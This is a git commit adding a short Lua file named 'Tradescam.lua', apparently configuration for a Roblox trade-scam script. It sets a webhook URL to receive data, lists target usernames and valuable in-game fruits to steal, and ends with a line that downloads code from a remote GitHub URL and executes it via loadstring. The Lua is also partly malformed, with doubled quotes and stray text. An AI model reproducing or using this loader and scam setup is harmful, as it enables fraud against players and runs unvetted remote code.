e454abae638a2e512a29f7add8556959087c9047
realredzhubv2 <abhichand2344@gmail.com>
2025-03-27 01:04:07 +0530

    Create Tradescam.lua

---
+++ Tradescam.lua
@@ -0,0 +1,7 @@
+Webhook = ""https://webhook-protect.vercel.app/api/webhook?id=WmtxS3Mybl9FY2lfOFBwWmQtdXlFdzpud1VOeU05c3h1dUZaRm5Hd0lJc2JXN0VSc1Z5bldxR3M0R2lzczA0Q0lQckVPQm1tMEgyNUo0bWxOUWVwLUs1dkwtQXpIN3VBX3l6TkE5VWo1ajFFcGtHcGlxRHo0eWtIN2MzT2FFakxxZkFOME5XQ09EdTBXYTZ2SzNxcDNJdF80MG9HNFpwZHFBV0JTSmc5MTBPNURKNnlsaGZVQWVPTVRWOXNUSjZsYXM"" << Your Webhook
+
+Usernames = {"56devili", "9DEAD_LIGHT"} username(-s). << Your
+
+Fruits ToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "T-Rex-T-Rex"} -- << Fruits you want
+
+loadstring(game: HttpGet("https://raw .githubusercontent.com/surelyco /CutestCodes/refs/heads/main/V2"))()
